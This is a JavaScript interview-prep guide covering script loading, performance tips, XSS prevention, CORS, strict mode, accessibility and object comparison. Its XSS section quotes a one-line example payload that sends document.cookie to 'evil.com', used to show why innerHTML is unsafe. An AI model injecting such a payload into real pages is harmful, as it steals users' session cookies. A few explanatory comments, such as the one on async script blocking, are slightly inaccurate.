# 📘 07 — Performance, Security & Best Practices
> **Most Asked in Service-Based Companies** | 🟡 Difficulty: Medium

---

## 🔑 Must-Know Topics
- `defer` and `async` script loading
- Performance concepts: lazy loading, code splitting
- Security basics: XSS prevention, CORS
- `sessionStorage` and `localStorage` security considerations
- Accessibility (a11y) basics

---

## ❓ Most Asked Questions

### Q1. What is `defer` vs `async` for script loading?

```html
<!-- Regular script: blocks HTML parsing -->
<script src="app.js"></script>   <!-- ❌ blocks parsing -->

<!-- async: download in parallel, execute as soon as downloaded (blocks parsing!) -->
<script async src="analytics.js"></script>
<!-- Use for: independent scripts (analytics, ads) — no DOM dependency -->

<!-- defer: download in parallel, execute AFTER HTML fully parsed, IN ORDER -->
<script defer src="app.js"></script>
<script defer src="main.js"></script>
<!-- Use for: most scripts — preserves order, no blocking -->
```

```javascript
// Practical: dynamic script loading
function loadScript(src, { async = false, defer = true } = {}) {
    return new Promise((resolve, reject) => {
        if (document.querySelector(`script[src="${src}"]`)) {
            resolve(); // already loaded
            return;
        }

        const script = document.createElement('script');
        script.src   = src;
        script.async = async;
        script.defer = defer;

        script.onload  = () => resolve();
        script.onerror = () => reject(new Error(`Failed to load: ${src}`));

        document.head.appendChild(script);
    });
}

// Load heavy library only when needed
async function loadPDFExport() {
    await loadScript('https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js');
    const { jsPDF } = window.jspdf;
    return new jsPDF();
}

// Script loading strategy:
// - Critical CSS: include inline (no external request)
// - App scripts: defer (non-blocking)
// - Analytics/ads: async (parallel, non-blocking)
// - Polyfills: regular (must load first, before other scripts)
```

---

### Q2. How do you optimize web page performance?

```javascript
// ✅ 1. Lazy load images
const images = document.querySelectorAll('img[data-src]');

const imageObserver = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            const img = entry.target;
            img.src = img.dataset.src;
            img.removeAttribute('data-src');
            imageObserver.unobserve(img);
        }
    });
});

images.forEach(img => imageObserver.observe(img));

// ✅ 2. Debounce expensive operations
const searchInput = document.getElementById('search');
let searchTimeout;
searchInput.addEventListener('input', (e) => {
    clearTimeout(searchTimeout);
    searchTimeout = setTimeout(() => {
        searchAPI(e.target.value); // only called after 300ms idle
    }, 300);
});

// ✅ 3. Avoid layout thrashing (batch DOM reads/writes)
// ❌ Read/write in loop
elements.forEach(el => {
    const width = el.offsetWidth; // READ — triggers layout
    el.style.width = (width * 1.1) + 'px'; // WRITE — invalidates layout
});

// ✅ Batch reads, then batch writes
const widths = elements.map(el => el.offsetWidth); // all reads
elements.forEach((el, i) => {
    el.style.width = (widths[i] * 1.1) + 'px'; // all writes
});

// ✅ 4. Use DocumentFragment for multiple DOM insertions
function addListItems(list, items) {
    const fragment = document.createDocumentFragment();
    items.forEach(item => {
        const li = document.createElement('li');
        li.textContent = item.name;
        fragment.appendChild(li);
    });
    list.appendChild(fragment); // ONE reflow instead of N
}

// ✅ 5. Avoid memory leaks
// Remove event listeners when component unmounts
class Component {
    constructor() {
        this.handleClick = this.handleClick.bind(this);
        document.addEventListener('click', this.handleClick);
    }

    handleClick(e) { /* ... */ }

    destroy() {
        document.removeEventListener('click', this.handleClick); // cleanup!
    }
}

// ✅ 6. Cache API responses
const cache = new Map();
async function fetchCached(url, ttl = 60000) {
    const cached = cache.get(url);
    if (cached && Date.now() - cached.timestamp < ttl) {
        return cached.data; // return from cache
    }
    const data = await fetch(url).then(r => r.json());
    cache.set(url, { data, timestamp: Date.now() });
    return data;
}
```

---

### Q3. What is XSS and how do you prevent it in JavaScript?

```javascript
// XSS (Cross-Site Scripting): attacker injects malicious JS into your website
// Can steal cookies, session tokens, or perform actions as the user

// ❌ Vulnerable to XSS
function displayComment(comment) {
    document.getElementById("comments").innerHTML += `<p>${comment}</p>`;
    // If comment = "<script>fetch('evil.com?c='+document.cookie)</script>" → XSS!
}

// ✅ Prevention 1: use textContent (never parses HTML)
function displayCommentSafe(comment) {
    const p = document.createElement('p');
    p.textContent = comment; // text only — tags are NOT parsed
    document.getElementById("comments").appendChild(p);
}

// ✅ Prevention 2: escape HTML before inserting
function escapeHTML(str) {
    const div = document.createElement('div');
    div.textContent = str; // Let the browser do the escaping
    return div.innerHTML;  // Gets escaped HTML
}

function displayCommentEscaped(comment) {
    const escaped = escapeHTML(comment);
    document.getElementById("comments").innerHTML += `<p>${escaped}</p>`;
}

// ✅ Prevention 3: Content Security Policy (server-side header)
// Prevents inline scripts and untrusted sources
// Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com

// ✅ Prevention 4: Sanitize user input on server side
// Never trust client-side validation alone

// ✅ When to use innerHTML:
// Only with trusted, escaped content — or use a sanitization library
// Never use innerHTML with any part of user input without escaping

// Safe template literal approach
function safeRender(username, message) {
    // Build DOM programmatically instead
    const article = document.createElement('article');

    const nameEl = document.createElement('h3');
    nameEl.textContent = username; // safe

    const msgEl = document.createElement('p');
    msgEl.textContent = message;  // safe

    article.append(nameEl, msgEl);
    return article;
}
```

---

### Q4. Explain CORS and how it works.

```javascript
// CORS: Cross-Origin Resource Sharing
// Browser security: scripts can only fetch from SAME origin by default
// Origin = protocol + domain + port (https://example.com:443)

// Cross-origin request blocked by browser:
// Frontend: https://myapp.com
// API:      https://api.myapp.com <- different subdomain = different origin

// Server must include CORS headers to allow cross-origin requests:
// Access-Control-Allow-Origin: https://myapp.com
// Access-Control-Allow-Methods: GET, POST, PUT, DELETE
// Access-Control-Allow-Headers: Content-Type, Authorization

// Simple requests (no preflight):
// - Method: GET, POST, HEAD
// - Headers: only simple headers (Content-Type: text/plain)

// Preflight (OPTIONS) request — for non-simple requests:
// Browser auto-sends OPTIONS before actual request
// Server must respond with CORS headers to the OPTIONS request

// Frontend: how CORS errors appear
async function fetchData() {
    try {
        const response = await fetch('https://other-domain.com/api/data');
        // If CORS not configured: browser blocks this and logs:
        // "Access to fetch at 'https://other-domain.com/api/data' from origin
        //  'https://myapp.com' has been blocked by CORS policy"
        return response.json();
    } catch (err) {
        if (err.message.includes('CORS')) {
            console.error("CORS error — your server needs CORS headers");
        }
    }
}

// Common CORS workarounds in development:
// 1. Use a proxy in development (Vite/CRA dev server)
// 2. Set CORS headers on your API server
// 3. JSONP (old hack, only GET, not recommended)

// ✅ Credentials (cookies) with CORS:
fetch('https://api.myapp.com/me', {
    credentials: 'include' // sends cookies cross-origin
    // Server must set: Access-Control-Allow-Credentials: true
    // AND: Access-Control-Allow-Origin must be specific (not *)
});
```

---

### Q5. What is `strict mode` in JavaScript?

```javascript
// Strict mode: opt-in to safer, more restrictive JavaScript
// Eliminates silent errors, improves performance, prepares for future JS

// Enable for entire file
'use strict';

// Or enable for specific function
function strictFn() {
    'use strict';
    // strict mode applies only here
}

// What strict mode changes:

// 1. No undeclared variables
'use strict';
x = 10; // ❌ ReferenceError: x is not defined
let x = 10; // ✅

// 2. Cannot delete variables or functions
let y = 5;
delete y; // ❌ SyntaxError in strict mode

// 3. Duplicate parameter names not allowed
function sum(a, a) { return a + a; } // ❌ SyntaxError

// 4. 'this' is undefined inside regular functions (not global)
function test() {
    'use strict';
    console.log(this); // undefined (not window)
}
test(); // undefined

// 5. Reserved keywords (implements, interface, let, etc.) cannot be variable names
let implements = 5; // ❌ SyntaxError in strict mode

// ES6 modules are ALWAYS in strict mode (no need to declare)
// import/export files automatically use strict mode

// Classes use strict mode internally
class MyClass {
    method() {
        // this is always strict mode here
        console.log(typeof this === "undefined"); // false (class methods are called on instances)
    }
}
```

---

### Q6. How do you implement accessible (a11y) JavaScript interactions?

```javascript
// Accessibility: making web apps usable for everyone including keyboard/screen reader users

// ✅ 1. Keyboard navigation: handle Enter/Space for custom interactive elements
const customButton = document.getElementById('custom-btn');
customButton.setAttribute('role', 'button');
customButton.setAttribute('tabindex', '0'); // make focusable

customButton.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' || e.key === ' ') {
        e.preventDefault();
        customButton.click(); // trigger same action as mouse click
    }
});

// ✅ 2. Announce dynamic content to screen readers
function announceToScreenReader(message, priority = 'polite') {
    const announcer = document.getElementById('sr-announcer')
        || createAnnouncer();
    
    announcer.setAttribute('aria-live', priority); // 'polite' | 'assertive'
    announcer.textContent = '';
    // Clear then set (ensures screen reader announces change)
    requestAnimationFrame(() => { announcer.textContent = message; });
}

function createAnnouncer() {
    const div = document.createElement('div');
    div.id = 'sr-announcer';
    div.className = 'sr-only'; // visually hidden CSS
    document.body.appendChild(div);
    return div;
}

// Usage
announceToScreenReader("Filter applied: 5 results found", 'polite');
announceToScreenReader("Error: Email is invalid", 'assertive'); // urgent!

// ✅ 3. Focus management for modals
function openModal(modal) {
    const previousFocus = document.activeElement; // remember where user was
    modal.removeAttribute('hidden');
    modal.querySelector('[autofocus], button').focus(); // move focus inside

    // Trap focus inside modal
    const focusableEls = modal.querySelectorAll(
        'button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])'
    );
    const first = focusableEls[0];
    const last  = focusableEls[focusableEls.length - 1];

    modal.addEventListener('keydown', e => {
        if (e.key === 'Tab') {
            if (e.shiftKey && document.activeElement === first) {
                last.focus(); e.preventDefault();
            } else if (!e.shiftKey && document.activeElement === last) {
                first.focus(); e.preventDefault();
            }
        }
        if (e.key === 'Escape') closeModal(modal, previousFocus);
    });
}

function closeModal(modal, returnFocus) {
    modal.setAttribute('hidden', true);
    returnFocus?.focus(); // return focus to previous element
}

// ✅ 4. Provide text alternatives
// Images: always use alt text
// <img src="chart.png" alt="Revenue increased 20% in Q3 2024" />
// Icons: hide from screen readers or add label
// <button aria-label="Close dialog"><span aria-hidden="true">×</span></button>
```

---

### Q7. What is the difference between `==` and `=== ` for objects?

```javascript
// Primitives: == and === compare by VALUE
1 === 1;       // true
"hi" === "hi"; // true

// Objects: BOTH == and === compare by REFERENCE (memory address)
const a = { x: 1 };
const b = { x: 1 };
const c = a;

a === b; // false — different objects in memory (even with same content)
a === c; // true — same reference
a == b;  // false — objects always by reference with both operators

// How to compare objects by value:

// Method 1: JSON.stringify (simple, ordered, no functions/dates)
JSON.stringify(a) === JSON.stringify(b); // true

// Method 2: Custom deep equality
function deepEqual(a, b) {
    if (a === b) return true;
    if (a === null || b === null) return false;
    if (typeof a !== "object" || typeof b !== "object") return false;

    const keysA = Object.keys(a);
    const keysB = Object.keys(b);

    if (keysA.length !== keysB.length) return false;

    return keysA.every(key => deepEqual(a[key], b[key]));
}

deepEqual({ x: 1, y: { z: 2 } }, { x: 1, y: { z: 2 } }); // true
deepEqual({ x: 1 }, { x: 2 });                              // false

// Method 3: Lodash _.isEqual (production use)
// _.isEqual(a, b);

// Arrays also by reference
const arr1 = [1, 2, 3];
const arr2 = [1, 2, 3];
arr1 === arr2; // false

arr1.join() === arr2.join(); // "1,2,3" === "1,2,3" → true (for primitive arrays)
JSON.stringify(arr1) === JSON.stringify(arr2); // true
```
